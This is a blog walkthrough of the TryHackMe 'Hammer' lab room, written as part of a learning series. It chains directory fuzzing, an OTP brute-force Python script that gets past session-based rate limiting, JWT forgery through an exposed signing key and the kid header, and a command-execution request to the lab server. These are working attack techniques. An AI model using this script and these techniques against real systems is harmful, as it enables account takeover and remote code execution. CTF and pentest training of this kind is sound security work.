---
title: "TryHackMe Hammer - Auth Bypass to RCE via Chained Vulnerabilities"
date: 2026-04-01T23:30:00+05:30
lastmod: 2026-04-01T23:30:00+05:30
author: Animesh Roy
avatar: /img/avatar.jpeg
authorlink: https://bit.ly/34sGFiK
featureimage: img/thm.png
simg: img/thm.png
categories:
  - TryHackMe
tags:
  - tryhackme
  - rooms
  - thm
  - authentication
  - jwt
  - rce
  - rate-limiting
  - otp
  - brute-force
  - bug-bounty
  - pentesting
draft: false
description: "Walkthrough of the TryHackMe Hammer challenge room -- chaining 5 vulnerabilities from directory fuzzing to RCE: email discovery in logs, OTP brute force via session rotation, JWT kid header exploitation, and command execution."
---

## Overview

The **Hammer** room on TryHackMe is a medium-difficulty challenge that demonstrates how multiple moderate vulnerabilities can be chained together for complete system compromise. The attack chain goes from discovering a hidden email address to achieving Remote Code Execution (RCE) on the target system.

**Attack Chain:**

```
Directory Fuzzing --> Email in Logs --> OTP Brute Force --> JWT Forge --> RCE
```

This is exactly the kind of multi-step exploitation you encounter in real bug bounty programs, where individual findings chain into critical impact.

## Step 1: Reconnaissance and Email Discovery

### Port Scan

```bash
nmap TARGET_IP -p1-65535 -T4
```

This reveals two open ports:
- **Port 22** -- SSH
- **Port 1337** -- HTTP (the target web application)

### HTML Source Analysis

Viewing the page source reveals a developer comment:

```html
<!-- Dev Note: Directory naming convention must be hmr_DIRECTORY_NAME -->
```

This tells us the directory naming convention. Time to fuzz.

### Directory Fuzzing

Create a custom wordlist using the naming convention:

```bash
sed 's/^/hmr_/' /usr/share/seclists/Discovery/Web-Content/common.txt > hmr_wordlist.txt
ffuf -w hmr_wordlist.txt -u http://TARGET_IP:1337/FUZZ
```

This discovers `hmr_logs` -- an Apache error log directory. Reading the logs reveals a valid email address being used for authentication: `tester@hammer.thm`.

### Bug Bounty Takeaway

Always check HTML comments for developer notes. Directory naming conventions, internal endpoints, and debug info are commonly left in production code. Tools like `ffuf`, `dirsearch`, or `gobuster` with custom wordlists based on discovered patterns are essential.

## Step 2: Bypassing Rate Limiting on Password Reset

The password reset feature sends a **4-digit OTP** code. That is only 10,000 possible combinations -- brute-forceable if we can bypass rate limiting.

### The Rate Limit

After **6 failed OTP attempts**, the server responds with:

```
Rate limit exceeded. Please try again later.
```

But the rate limit is tied to the `PHPSESSID` cookie, not the user account.

### The Bypass

**Session Rotation:** Get a fresh `PHPSESSID` every 6 attempts by making a new request to the homepage. This resets the attempt counter.

**Timer Bypass:** The OTP countdown timer runs client-side with a hidden form field `s` containing the TTL value. By setting `extend_ttl` to a massive number (like `999999999`), the OTP never expires.

### Bug Bounty Takeaway

Rate limits tied to sessions instead of accounts are a common vulnerability. Always test:

1. Does getting a **new session/cookie** reset the counter?
2. Is the counter **per IP** (bypassable with `X-Forwarded-For`) or **per account**?
3. Are there **client-side controls** (timers, hidden fields) that can be manipulated?

## Step 3: OTP Brute Force with Session Rotation

The attack script automates the entire flow:

```python
import requests
import re

TARGET = "http://TARGET_IP:1337"

def get_session_and_ttl():
    """Get fresh PHPSESSID and extract TTL from hidden field"""
    session = requests.Session()
    # Request password reset
    session.post(f"{TARGET}/reset_password.php", data={
        "email": "tester@hammer.thm"
    })
    resp = session.get(f"{TARGET}/reset_password.php")
    ttl_match = re.search(r'name="s"\s+value="(\d+)"', resp.text)
    ttl = ttl_match.group(1) if ttl_match else "180"
    return session, ttl

def brute_force():
    code_iter = iter(range(10000))
    while True:
        session, ttl = get_session_and_ttl()
        
        for attempt in range(6):  # 6 attempts per session
            try:
                otp = f"{next(code_iter):04d}"
            except StopIteration:
                print("Exhausted all codes!")
                return
            
            resp = session.post(f"{TARGET}/reset_password.php", data={
                "recovery_code": otp,
                "s": "999999999"  # Extended TTL
            })
            
            if "Invalid or expired" not in resp.text:
                print(f"FOUND OTP: {otp}")
                # Complete password reset
                return session
        
        print(f"Rotating session... tried up to {otp}")

brute_force()
```

### Bug Bounty Takeaway

When you find session-based rate limiting with a small OTP space:
- **4 digits** = 10,000 combos = minutes with automation
- **6 digits** = 1,000,000 combos = hours but still feasible
- Document the rate limit bypass **separately** from the brute force -- each is a valid finding

## Step 4: JWT Token Manipulation for Privilege Escalation

After resetting the password and logging in, the application issues a JWT token.

### Decoding the JWT

```
Header:  {"kid": "/var/www/mykey.key", "alg": "HS256"}
Payload: {"role": "user", "user_id": 1, "email": "tester@hammer.thm"}
```

Two critical observations:
1. The `kid` (Key ID) header points to a **file path** on the server
2. The `role` field is `"user"` -- we need `"admin"`

### Finding the Signing Key

The dashboard reveals a file `188ade1.key` in the web root. Download it:

```bash
curl http://TARGET_IP:1337/188ade1.key
```

This gives us the HMAC secret used to sign JWT tokens.

### Forging an Admin Token

Using a JWT tool (jwt.io, token.dev, or Python):

1. Change `role` from `"user"` to `"admin"`
2. Update `kid` to `"/var/www/html/188ade1.key"`
3. Sign with the downloaded key content (raw text, NOT base64)

**Critical detail:** Send the forged JWT in the `Authorization: Bearer` header, not as a cookie.

### Bug Bounty Takeaway

JWT vulnerabilities to always test:

| Test | What to Look For |
|---|---|
| `kid` header | File path injection, SSRF, SQL injection |
| `alg` header | Change to `none`, switch RS256 to HS256 |
| Signing key | Exposed in web root, default/weak keys |
| Token in response | Sometimes the full key is in an API response |
| Role/privilege claims | Modify and re-sign if you have the key |

## Step 5: Remote Code Execution

With the admin JWT, the dashboard command execution endpoint becomes accessible:

```http
POST /dashboard.php HTTP/1.1
Authorization: Bearer FORGED_ADMIN_JWT
Content-Type: application/x-www-form-urlencoded

command=cat /home/ubuntu/flag.txt
```

The server executes the command and returns the flag.

## The Full Chain

```
1. HTML comment reveals directory naming convention
2. ffuf discovers hmr_logs with email address
3. Password reset sends 4-digit OTP
4. Session-based rate limit bypassed via cookie rotation
5. Client-side timer bypassed via hidden field manipulation
6. OTP brute forced in ~1667 sessions (10000/6)
7. JWT decoded reveals kid file path
8. Signing key found in web root
9. JWT forged with admin role
10. RCE via command execution endpoint
```

Each vulnerability alone might be medium severity. **Chained together, they give full system access.**

## Key Lessons for Bug Bounty

1. **Always read HTML source** -- developer comments are goldmines
2. **Test rate limits aggressively** -- session rotation, IP spoofing, header manipulation
3. **Client-side controls are decorative** -- timers, hidden fields, JavaScript validation
4. **JWT kid header is a target** -- check for file path injection, SSRF
5. **Check web root for sensitive files** -- keys, configs, backups
6. **Chain findings** -- a P4 + P3 + P3 + P2 can equal P1 impact
7. **Document each step** -- even if you chain them, each individual bypass has value

## Room Link

[TryHackMe - Hammer](https://tryhackme.com/r/room/hammer) (Web Application Pentesting path, Authentication module)

---

*This post is part of my TryHackMe learning series. Techniques documented here are for authorized security testing only.*
